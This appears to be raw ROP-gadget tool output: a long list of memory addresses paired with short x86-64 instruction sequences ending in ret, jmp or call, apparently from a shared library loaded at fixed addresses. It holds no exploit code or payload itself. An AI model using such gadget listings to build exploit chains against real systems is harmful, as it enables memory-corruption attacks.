0x00002aaaaac09deb : enter 0x4289, 0x10 ; mov eax, 1 ; ret
0x00002aaaaac09ccb : enter 0x4289, 0xc ; mov eax, 1 ; ret
0x00002aaaaab53808 : enter 0x4801, -0x77 ; pop r8 ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaaaf49ba : enter 0x48ff, -0x7d ; rol dword ptr [rbx + rbp*8], -0x34 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaaad6b15 : enter 0x59e7, 0x5b ; ret 0x2a63
0x00002aaaaab037c8 : enter 0x5d5b, 0x41 ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab5bf1b : enter 0x5d5b, 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab30775 : enter 0x5d5b, 0x41 ; pop rsp ; pop r13 ; ret
0x00002aaaaaaf5847 : enter 0x6411, 0x48 ; xor eax, dword ptr [0x30] ; call rax
0x00002aaaaab0a31c : enter 0x6411, 0x48 ; xor eax, dword ptr [0x30] ; jmp rax
0x00002aaaaac59e9c : enter 0x8ac, 0x47 ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00002aaaaab0f68d : enter 0x948, -0x30 ; ret
0x00002aaaaabbd5d9 : enter 0xf41, -0x62 ; ret 0x844
0x00002aaaaab46bf9 : enter 0xf48, 0x4f ; ror dword ptr [rax - 0x7b], -0x2e ; jne 0x71bfb ; ret
0x00002aaaaab4ff39 : enter 0xf48, 0x4f ; ror dword ptr [rax - 0x7b], -0x2e ; jne 0x7af3b ; ret
0x00002aaaaac43946 : enter 0xf66, -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab5dfa1 : enter 0xf66, -0x15 ; ret
0x00002aaaaac1eaac : enter 0xf66, 0x3a ; movsxd rcx, ecx ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaab09cb8 : enter 0xf66, 0x6e ; enter 0x280f, -0x3f ; ret
0x00002aaaaabb85c9 : enter 3, 0 ; mov qword ptr [rsp + 0x18], rdx ; call 0x1f8ab
0x00002aaaaab9cbe7 : enter 4, 0x48 ; add esp, 0x80 ; pop rbx ; ret
0x00002aaaaab7c4c4 : enter 5, 0 ; ret
0x00002aaaaac7d805 : fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; call qword ptr [rcx]
0x00002aaaaac7d785 : fadd dword ptr [rax] ; add byte ptr [rax + 0x25], bh ; int1 ; jmp qword ptr [rcx]
0x00002aaaaabeaff6 : fadd dword ptr [rax] ; add byte ptr [rax], al ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab50237 : fadd dword ptr [rax] ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x18] ; jmp rax
0x00002aaaaab50703 : fadd dword ptr [rax] ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x40] ; jmp rax
0x00002aaaaabd923d : fadd dword ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd9380 : fadd dword ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaab1acf6 : fadd dword ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaabe9f75 : fadd dword ptr [rax] ; leave ; ret
0x00002aaaaab574bf : fadd dword ptr [rbp - 0x78] ; or al, 0x18 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab6e040 : fadd dword ptr [rbx + 0x39480fe0] ; fmul dword ptr [rax + 0xf] ; ret
0x00002aaaaac1187d : fadd dword ptr [rbx - 0x76b7f820] ; ret
0x00002aaaaac87d28 : fadd dword ptr [rbx - 0xa] ; jmp rdi
0x00002aaaaac412a4 : fadd dword ptr [rbx] ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaab45980 : fadd dword ptr [rcx + rcx*4 + 0x65] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac8d7bd : fadd dword ptr [rcx] ; add al, ah ; fdiv st(7) ; jmp rdi
0x00002aaaaac90883 : fadd dword ptr [rcx] ; add esi, ebp ; add al, byte ptr [rax] ; ret
0x00002aaaaab49d17 : fadd dword ptr [rdi + rcx + 0x47] ; ret
0x00002aaaaab23d8b : fadd dword ptr [rip - 0x77cb800] ; dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaab9a57e : fadd qword ptr [r9] ; ret
0x00002aaaaac2bcd6 : fadd qword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac84114 : fadd qword ptr [rcx + 1] ; add al, ch ; sub ch, dh ; jmp qword ptr [rbx]
0x00002aaaaab9a57f : fadd qword ptr [rcx] ; ret
0x00002aaaaab8ff17 : fadd st(1) ; call 0xffffffff89cdd842
0x00002aaaaab90281 : fadd st(1) ; call 0xffffffff89cddbac
0x00002aaaaac6e504 : fadd st(2), st(0) ; add dword ptr [rax], eax ; je 0x1994f7 ; idiv edi ; hlt ; ret 1
0x00002aaaaac46d48 : fadd st(3) ; nop word ptr [rax + rax] ; ret
0x00002aaaaabcad30 : fadd st(3) ; nop word ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaab800b8 : fadd st(3) ; nop word ptr [rax + rax] ; xor rax, rax ; ret
0x00002aaaaac44c9e : fadd st(3) ; ret
0x00002aaaaabda240 : fadd st(6) ; add al, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaac431ad : fbld dword ptr [rcx + 2] ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaac43491 : fbld dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac484fc : fbstp dword ptr [rbp - 0x17] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5c8d1 : fbstp dword ptr [rbx] ; add byte ptr [rcx], al ; add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaab44b69 : fbstp dword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], cl ; pop r12 ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac4348f : fbstp dword ptr [rdx - 0x10f09921] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab96bb7 : fcmovb st(0), st(1) ; clc ; add eax, 0x2907fec1 ; ret 0x8944
0x00002aaaaab91b0d : fcmovb st(0), st(1) ; cli ; add ch, byte ptr [rcx] ; ret 0x48d
0x00002aaaaac594d8 : fcmovb st(0), st(3) ; ret
0x00002aaaaaad7b7e : fcmovu st(0), st(5) ; jb 0x2b22 ; test word ptr [rbx - 0x2e], bp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaab014ae : fcom dword ptr [rax - 0x3ece49f1] ; ret 0x4809
0x00002aaaaac5d610 : fcom qword ptr [rcx - 0xc] ; jmp rsi
0x00002aaaaabd6d99 : fcomi st(1) ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaac5d4cd : fcomi st(3) ; call qword ptr [rcx]
0x00002aaaaac812c9 : fcomi st(3) ; call qword ptr [rdi]
0x00002aaaaac5d4e9 : fcomi st(3) ; call rcx
0x00002aaaaac5d479 : fcomi st(3) ; call rsp
0x00002aaaaac5d4c5 : fcomi st(3) ; dec dword ptr [rsi - 0x24] ; jmp qword ptr [rdi]
0x00002aaaaac5d4e5 : fcomi st(3) ; inc dword ptr [rcx - 0x25] ; call rcx
0x00002aaaaac5d339 : fcomi st(3) ; jmp qword ptr [rdi]
0x00002aaaaac82c11 : fcomi st(4) ; call qword ptr [rbx]
0x00002aaaaac89da9 : fcomi st(6) ; jmp rsi
0x00002aaaaabfd6bd : fcomp dword ptr [rbp + 0x41] ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaaf524d : fcomp dword ptr [rbx + 0x41] ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaab0579e : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab08c3a : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaff837 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaab42feb : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab076ac : fcomp dword ptr [rbx + 0x5d] ; ret
0x00002aaaaab58934 : fcomp dword ptr [rbx - 0x3d] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac5a259 : fcomp dword ptr [rdx + 0x21] ; ret
0x00002aaaaabd640b : fcomp dword ptr [rdx + 0x5b] ; ret
0x00002aaaaac84978 : fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac584c0 : fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x00002aaaaac81128 : fcomp st(1) ; call qword ptr [rbx]
0x00002aaaaac81168 : fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaabd6ecc : fcomp st(1) ; int1 ; dec dword ptr [rcx - 0x75] ; jge 0x101edc ; call rbx
0x00002aaaaac811a8 : fcomp st(1) ; jmp qword ptr [rcx]
0x00002aaaaac5d2c9 : fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d2c5 : fcompi st(3) ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d2c1 : fcompi st(3) ; dec ecx ; fcompi st(3) ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d25d : fcompi st(3) ; ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaab73080 : fcompi st(3) ; ret
0x00002aaaaac82e79 : fcompi st(4) ; call qword ptr [rbx]
0x00002aaaaac82e31 : fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaab3fc45 : fdiv dword ptr [rax + rbx + 0x48] ; add esp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaac851b8 : fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac4395f : fdiv dword ptr [rdx - 0x10f09928] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac87014 : fdiv qword ptr [rax + 1] ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7b014 : fdiv qword ptr [rax - 0x4e780000] ; out dx, al ; call qword ptr [rax]
0x00002aaaaac4375f : fdiv qword ptr [rdx - 0x10f09924] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac7d079 : fdiv st(0) ; call qword ptr [rax]
0x00002aaaaabd7003 : fdiv st(1) ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd7010 : fdiv st(1) ; dec dword ptr [rcx - 0x75] ; jge 0x10201e ; call rbx
0x00002aaaaac5d509 : fdiv st(3) ; jmp qword ptr [rdi]
0x00002aaaaac5d51d : fdiv st(3) ; jmp rax
0x00002aaaaab8f674 : fdiv st(3) ; ret
0x00002aaaaac6971d : fdiv st(3), st(0) ; jmp qword ptr [rax]
0x00002aaaaabe451f : fdiv st(6) ; ret 0xf02
0x00002aaaaac8d7c1 : fdiv st(7) ; jmp rdi
0x00002aaaaac78848 : fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaac83914 : fdivr qword ptr [rcx] ; add dword ptr [rax], eax ; sbb byte ptr [rbx], al ; cmc ; call qword ptr [rdi]
0x00002aaaaac83d14 : fdivr qword ptr [rip + 0x1e380001] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6fb99 : fdivr st(2) ; jmp rsp
0x00002aaaaaba230f : fdivr st(3) ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac69631 : fdivr st(3) ; jmp rax
0x00002aaaaac69611 : fdivr st(3) ; push rax ; fsincos ; call rax
0x00002aaaaac5d489 : fdivr st(3), st(0) ; call qword ptr [rcx]
0x00002aaaaac5d459 : fdivr st(3), st(0) ; jmp qword ptr [rdi]
0x00002aaaaac5d455 : fdivr st(3), st(0) ; ljmp ptr [rdx] ; fdivr st(3), st(0) ; jmp qword ptr [rdi]
0x00002aaaaac57815 : fdivr st(4) ; test al, 0x97 ; xchg eax, esp ; ret
0x00002aaaaac837a8 : fdivr st(5) ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f514 : fdivr st(5), st(0) ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac4101d : fdivr st(7) ; ret
0x00002aaaaab79b1e : fdivr st(7) ; xor cl, cl ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaac8d999 : fdivrp st(7) ; jmp rdi
0x00002aaaaab7b2ee : femms ; add byte ptr [rbx + 0x63], cl ; or al, 0x83 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab5cfc2 : fiadd dword ptr [rax] ; add byte ptr [rax], al ; mov rsi, rbp ; mov rdi, rbx ; call rax
0x00002aaaaabcba92 : fiadd dword ptr [rbx + 0x2a8247c] ; cmove eax, edx ; ret
0x00002aaaaab474b4 : fiadd dword ptr [rbx + 0x394803e2] ; ret 0xf48
0x00002aaaaabe9c12 : fiadd dword ptr [rbx + 0x3b8eaf8] ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0x90c3
0x00002aaaaabe9252 : fiadd dword ptr [rbx + rbp] ; test eax, eax ; jne 0x11426a ; xor eax, eax ; ret
0x00002aaaaac2bec4 : fiadd dword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab70ddc : fiadd dword ptr [rcx + 0xf] ; xchg eax, ebx ; ret
0x00002aaaaabe9d7f : fiadd dword ptr [rcx - 0xfff05] ; dec dword ptr [rdi] ; ret 0x8348
0x00002aaaaac03189 : fiadd dword ptr [rcx - 1] ; push rbp ; adc byte ptr [rcx], bh ; ret
0x00002aaaaac8d9d5 : fiadd dword ptr [rcx] ; add al, ch ; fdivrp st(7) ; jmp rdi
0x00002aaaaac8d995 : fiadd dword ptr [rcx] ; add byte ptr [rax], bh ; fdivrp st(7) ; jmp rdi
0x00002aaaaab9788e : fiadd word ptr [r9] ; ret
0x00002aaaaac7dd4d : fiadd word ptr [rax] ; add byte ptr [rax], al ; pop rbp ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7dd65 : fiadd word ptr [rax] ; add byte ptr [rax], bl ; pop rbp ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac00f90 : fiadd word ptr [rax] ; add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; call qword ptr [rax]
0x00002aaaaac2bad4 : fiadd word ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6e9e5 : fiadd word ptr [rcx] ; add byte ptr [rcx + rcx*2 - 8], dl ; jmp rsp
0x00002aaaaab9788f : fiadd word ptr [rcx] ; ret
0x00002aaaaab10290 : fiadd word ptr [rip + 0x48000000] ; mov dword ptr [rsi + 0x10], eax ; xor eax, eax ; ret
0x00002aaaaaaf6950 : ficom dword ptr [rsi] ; add byte ptr [rdx + 0x4a], bh ; call 0x2dc4a
0x00002aaaaaaf694f : ficom dword ptr gs:[rsi] ; add byte ptr [rdx + 0x4a], bh ; call 0x2dc4b
0x00002aaaaabd7559 : ficomp word ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaac5a0a6 : ficomp word ptr [rdx - 0x19] ; cmc ; mov ch, 0xab ; ret
0x00002aaaaac48988 : fidiv dword ptr [rbp - 0x13] ; pop rbx ; ret
0x00002aaaaaad6b0f : fidiv dword ptr [rbx] ; push rdx ; test dword ptr [rbx + 0x59e7c8ee], esi ; pop rbx ; ret 0x2a63
0x00002aaaaabbe64b : fidiv dword ptr [rcx] ; shr al, 0x7d ; ret
0x00002aaaaac12182 : fidiv dword ptr [rdi - 0x3f7affd8] ; je 0x13d19a ; xor eax, eax ; ret
0x00002aaaaac4385f : fidiv dword ptr [rdx - 0x10f09926] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac0eb97 : fidiv word ptr [rcx] ; ror byte ptr [rax - 0x77], 0xef ; add rbx, r12 ; call r14
0x00002aaaaac4355f : fidiv word ptr [rdx - 0x10f09922] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac17905 : fidivr dword ptr [rax + 1] ; ret
0x00002aaaaabbc29f : fidivr dword ptr [rcx] ; ret 0x3673
0x00002aaaaabd47ee : fidivr word ptr [rdi] ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x89 ; ret 0xfffe
0x00002aaaaab1c278 : fild dword ptr [rax + 0xf3a007d] ; xchg eax, esp ; ret
0x00002aaaaabe52b4 : fild dword ptr [rax - 0x6af0d207] ; ret
0x00002aaaaabc0af5 : fild dword ptr [rbx + 0xf4104f8] ; xchg eax, esp ; ret
0x00002aaaaabc00f8 : fild dword ptr [rbx - 0x72befb08] ; add al, byte ptr [rcx + 0xf] ; xchg eax, esp ; ret
0x00002aaaaac2be26 : fild dword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab9183d : fild dword ptr [rcx + 1] ; ret
0x00002aaaaac7de45 : fild word ptr [rax] ; add byte ptr [rax + 0x64], cl ; int1 ; call qword ptr [rdx]
0x00002aaaaaba6f17 : fild word ptr [rbx - 0x6bf0bf08] ; ret 0xf983
0x00002aaaaac2ba36 : fild word ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabd07d6 : fild word ptr [rcx + 0xf] ; xor byte ptr [rcx], 0xc0 ; ret
0x00002aaaaab254b8 : fild word ptr [rcx + rcx*4 - 0x40] ; ret
0x00002aaaaab571e2 : fimul dword ptr [rax + 0x21] ; ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2916a07
0x00002aaaaaba78ce : fimul dword ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab12935 : fimul dword ptr [rax + 0x39] ; ret 0xf48
0x00002aaaaab5fec5 : fimul dword ptr [rax + 0xf] ; mov esp, 0xd00148d2 ; sub rax, rdi ; ret
0x00002aaaaac1a186 : fimul dword ptr [rax + rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaaaf8650 : fimul dword ptr [rax - 0x73] ; jp 0x23670 ; mov qword ptr [rbp - 0x58], rdx ; call 0x1f8ab
0x00002aaaaab49140 : fimul dword ptr [rax - 0x77] ; ror dword ptr [rax + 0x29], cl ; ret
0x00002aaaaab070c0 : fimul dword ptr [rax - 0x7d] ; ret
0x00002aaaaac0bd82 : fimul dword ptr [rax - 0x7d] ; ret 0x4812
0x00002aaaaabf259b : fimul dword ptr [rax - 0x7d] ; ret 0xe801
0x00002aaaaab83e47 : fimul dword ptr [rax - 9] ; fimul dword ptr [rax + 0x39] ; ret 0xf48
0x00002aaaaab63952 : fimul dword ptr [rax - 9] ; ret 0xfff8
0x00002aaaaaaf492a : fimul dword ptr [rcx + 0x5b58003a] ; pop rbp ; ret
0x00002aaaaac03816 : fimul dword ptr [rcx + rcx*4 - 0x1a] ; mov rdi, rbp ; call rax
0x00002aaaaac3fdc2 : fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39cbce1
0x00002aaaaac40e42 : fimul dword ptr [rcx - 0x7d] ; call 0xffffffffc39ccd61
0x00002aaaaabbd4d3 : fimul dword ptr [rdi] ; popfq ; ret
0x00002aaaaac1039f : fimul word ptr [rax - 0x77] ; out dx, eax ; call rcx
0x00002aaaaab4c5ee : fimul word ptr [rax - 0x77] ; ret
0x00002aaaaab841b4 : fimul word ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab587f1 : fimul word ptr [rax - 0x7d] ; ret 0x4810
0x00002aaaaab1d38e : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x483e8
0x00002aaaaab1ef6e : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x49fc8
0x00002aaaaab13057 : fimul word ptr [rcx + 0x19] ; ret 0xed85
0x00002aaaaaaff215 : fimul word ptr [rcx + 0xf082444] ; mov bh, 0x43 ; add al, 0x29 ; ret 0x8941
0x00002aaaaab0c360 : fimul word ptr [rcx + rcx*4 - 0x19] ; call r15
0x00002aaaaac0cdee : fimul word ptr [rcx + rcx*4 - 1] ; call qword ptr [rax]
0x00002aaaaac0ec7c : fimul word ptr [rcx + rcx*4 - 1] ; call r14
0x00002aaaaab13051 : fimul word ptr [rcx - 0x77] ; dec byte ptr [rbp + 0x29] ; fimul word ptr [rcx + 0x19] ; ret 0xed85
0x00002aaaaab8d5e1 : fimul word ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaab08294 : fist word ptr [rax + rax] ; movsxd rcx, dword ptr [rdi + rcx*4] ; add rcx, rdi ; jmp rcx
0x00002aaaaabd8ac5 : fistp qword ptr [rbp - 0x74b6000f] ; jge 0x103ad5 ; call rbx
0x00002aaaaabe9965 : fistp qword ptr [rip + 0x3948002b] ; ret 0x840f
0x00002aaaaac07436 : fistp qword ptr [rsi + 1] ; mov ebp, eax ; call 0x12e71a
0x00002aaaaab4721f : fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47067 : fistp word ptr [rbx + 0x48] ; mov eax, dword ptr [rax + 0x28] ; jmp rax
0x00002aaaaac0ed21 : fistp word ptr [rbx + 0x5d] ; jmp rax
0x00002aaaaab9c336 : fistp word ptr [rbx - 0x17] ; imul eax, dword ptr [rbp + 0x1f0ffff5], 0 ; pop rbx ; ret
0x00002aaaaac0b9e8 : fistp word ptr [rbx - 0x17] ; mov ecx, 0x90ffee8e ; pop rbx ; ret
0x00002aaaaab52882 : fisttp dword ptr [rax + 0x21] ; ret
0x00002aaaaab99e28 : fisttp dword ptr [rax + 0x39] ; ret
0x00002aaaaac484f9 : fisttp dword ptr [rax - 0x77] ; fbstp dword ptr [rbp - 0x17] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaff8dc : fisttp dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaac48985 : fisttp dword ptr [rax - 0x77] ; fidiv dword ptr [rbp - 0x13] ; pop rbx ; ret
0x00002aaaaab1e011 : fisttp dword ptr [rax - 0x77] ; ret
0x00002aaaaac4872d : fisttp dword ptr [rax - 0x77] ; sbb eax, 0x25200b ; jne 0x173723 ; pop rbx ; ret
0x00002aaaaabdd96e : fisttp dword ptr [rax - 0x77] ; sbb eax, 0x2ba8ca ; pop rbx ; ret
0x00002aaaaabb2eda : fisttp dword ptr [rcx + 0x7e10245c] ; ret 0x8b48
0x00002aaaaab1e02b : fisttp dword ptr [rcx - 0x77] ; ret 0x8b4a
0x00002aaaaab36f70 : fisttp dword ptr [rdi] ; lahf ; ret 0xd329
0x00002aaaaabc5324 : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00002aaaaab1c654 : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0x854d
0x00002aaaaab0b93f : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0xd521
0x00002aaaaab71274 : fisttp dword ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaabd7a39 : fisttp dword ptr [rdx] ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabcec91 : fisttp dword ptr [rsi] ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab13147 : fisttp qword ptr [rax + 0x29] ; ret
0x00002aaaaab58d6e : fisttp qword ptr [rax + 0x39] ; ret 0x860f
0x00002aaaaac1eb92 : fisttp qword ptr [rax + 0x63] ; ror dword ptr [rax + 1], -8 ; ret
0x00002aaaaaaf9ff5 : fisttp qword ptr [rax - 0x77] ; je 0x25027 ; cmp byte ptr [rax + 0xf], cl ; ret 0x8949
0x00002aaaaab83bb4 : fisttp qword ptr [rax - 0x77] ; ret
0x00002aaaaab8c275 : fisttp qword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret
0x00002aaaaab62b6a : fisttp qword ptr [rax - 1] ; ret 0xff48
0x00002aaaaabe2a42 : fisttp qword ptr [rcx + 0x29] ; fisttp word ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaabe2a45 : fisttp word ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab08c4a : fisttp word ptr [rax - 0x39] ; ret
0x00002aaaaab448c1 : fisttp word ptr [rax - 0x75] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaab9cf5c : fisttp word ptr [rax - 0x75] ; and al, 0x10 ; call rax
0x00002aaaaabfe921 : fisttp word ptr [rax - 0x77] ; or al, 0x24 ; call r12
0x00002aaaaabe2ad8 : fisttp word ptr [rax - 0x77] ; ret
0x00002aaaaab2e05b : fisttp word ptr [rax - 0x77] ; ret 0x8b48
0x00002aaaaab738f1 : fisttp word ptr [rax - 0x77] ; ret 0xc6e8
0x00002aaaaac48689 : fisttp word ptr [rax - 0x7b] ; push qword ptr [rbp - 0x16] ; pop rbx ; ret
0x00002aaaaab33690 : fisttp word ptr [rax - 0x7d] ; ret
0x00002aaaaab1e0af : fisttp word ptr [rax] ; add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaabca9ce : fisttp word ptr [rbp - 0x77] ; out 0xe8, al ; fld dword ptr [rcx] ; cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac0d0a2 : fisttp word ptr [rcx + 0xf] ; fmul qword ptr [rax - 0x7d] ; ret
0x00002aaaaabec187 : fisttp word ptr [rcx + rcx*4 - 0x1f] ; mov rsi, r12 ; call 0x73449
0x00002aaaaab5c557 : fisttp word ptr [rcx + rcx*4 - 6] ; call rax
0x00002aaaaabfea23 : fisttp word ptr [rcx - 0x77] ; in eax, 0x41 ; call rdi
0x00002aaaaac1f59d : fisttp word ptr [rip - 0x7cb80000] ; ret 0x4910
0x00002aaaaabd637d : fisttp word ptr [rsi + 0x2c] ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaabbedb8 : fisub dword ptr [rcx + rcx*4 + 0x10] ; mov eax, 0xffffffff ; ret
0x00002aaaaac43861 : fisub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabe9a9e : fisub dword ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret 0x144
0x00002aaaaac44d0f : fisub dword ptr [rsi + 0xf] ; xlatb ; shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x00002aaaaabb957c : fisub dword ptr [rsi - 0x7f] ; loop 0xe4587 ; add esi, esi ; ret
0x00002aaaaac43561 : fisub word ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabee7de : fisubr dword ptr [rdx] ; add byte ptr [rcx], al ; jmp 0x1195ad
0x00002aaaaac44d51 : fisubr word ptr [rax - 0x297af0f0] ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x00002aaaaac21ffc : fisubr word ptr [rcx] ; ret 0xfec5
0x00002aaaaac169b7 : fld dword ptr [rax + rax] ; mov edx, 0x190 ; call 0x2dc4a
0x00002aaaaac7d8fd : fld dword ptr [rax] ; add byte ptr [rax + 0x30], ah ; int1 ; jmp qword ptr [rcx]
0x00002aaaaab6d617 : fld dword ptr [rbp - 0x77] ; ret 0x1374
0x00002aaaaac2c014 : fld dword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabca9d3 : fld dword ptr [rcx] ; cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab7f30f : fld qword ptr [rax] ; add byte ptr [rax], al ; add rax, rdi ; add rax, rcx ; ret
0x00002aaaaac2bc24 : fld qword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabb3091 : fld qword ptr [rcx - 0x75] ; sbb al, 0xe9 ; adc eax, 0x1fffffe ; ret 0x8b49
0x00002aaaaac1cd00 : fld qword ptr [rdx] ; add byte ptr [rbx + 0x148b8104], cl ; xchg eax, ecx ; sub eax, edx ; ret
0x00002aaaaac58501 : fld qword ptr [rsi + 0x32] ; mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x00002aaaaab09f9e : fld st(0) ; fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab0a058 : fld xword ptr [rsp + 8] ; fscale ; fstp st(1) ; ret
0x00002aaaaab09f39 : fld xword ptr [rsp + 8] ; ret
